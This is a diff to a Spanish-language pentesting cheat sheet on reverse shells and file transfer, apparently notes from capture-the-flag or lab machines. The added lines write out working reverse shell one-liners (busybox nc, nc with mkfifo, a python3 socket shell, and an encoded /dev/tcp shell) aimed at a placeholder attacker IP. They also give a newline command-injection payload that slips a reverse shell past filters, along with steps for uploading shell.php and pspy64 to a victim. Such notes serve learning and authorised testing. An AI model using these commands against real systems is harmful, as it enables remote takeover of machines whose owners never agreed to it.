@@ -1,6 +1,6 @@
 # Shells reversas y transferencia de archivos
 
-Comandos usados en **Academia**, **ACEITUNO**, **GOIKO**, **Chimichurri** y en las notas de Windows.
+Comandos usados en **Academia**, **ACEITUNO**, **GOIKO**, **Chimichurri**, **Forward**, **Domino**, **Monitor silencioso** y en las notas de Windows.
 
 ## 1. Escucha en nuestro equipo
 
@@ -27,6 +27,36 @@ En una URL hay que codificarlo (`%26` = `&`, `%2F` = `/`):
 ```
 cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F<IP_LOCAL>%2F<PUERTO> 0>%261"
 ```
+
+**Con `busybox nc`** (víctimas mínimas, como en **Monitor silencioso**):
+
+```
+busybox nc <IP_LOCAL> <PUERTO> -e bash
+```
+
+**Con `nc` + mkfifo** (si `nc` no soporta `-e`, como en **Domino**):
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_LOCAL> <PUERTO> >/tmp/f
+```
+
+**Con `python3`** (sin necesidad de `nc` en la víctima):
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP_LOCAL>",<PUERTO>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'
+```
+
+### Command injection con salto de línea (`%0a`)
+
+Cuando un campo se pasa a un comando de shell y filtran `;`, `|` o `&`, el **newline URL-encoded** (`%0a`) termina el primer comando y lanza el siguiente (patrón de **Monitor silencioso**):
+
+```
+target=1.1.1.1%0abusybox+nc+<IP_LOCAL>+<PUERTO>+-e+bash
+```
+
+- Ojo: el `%0a` **no se debe codificar dos veces** si ya lo escribes codificado en la petición.
+- Primero validar con algo inocuo: `target=127.0.0.1%0awhoami`.
+- También funciona en parámetros de tipo IP que solo validan el prefijo (`127.0.0.1%0a...`).
 
 ## 3. Payloads con msfvenom
 
@@ -114,6 +144,19 @@ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
 chmod +x pspy64
 curl -o archivo http://<IP_LOCAL>/archivo
 ```
+
+**Con `python3 -m http.server`** (el más rápido para servir varios archivos desde Kali; en **Domino** y **Monitor silencioso** se usó para subir `shell.php` y `pspy64`):
+
+```
+# en Kali (desde la carpeta que quieres compartir)
+python3 -m http.server 80
+
+# en la víctima
+wget http://<IP_LOCAL>/shell.php
+```
+
+- También sirve al revés: lanzarlo **en la víctima** (`python3 -m http.server 8080`) para descargar sus ficheros desde Kali con `wget http://IP_VICTIMA:8080/archivo`.
+- Si el puerto 80 ya está ocupado por otro `http.server`, usar otro (`8080`).
 
 **Unidad redirigida de RDP** (la carpeta compartida con `/drive` aparece como `TSCLIENT`):
 
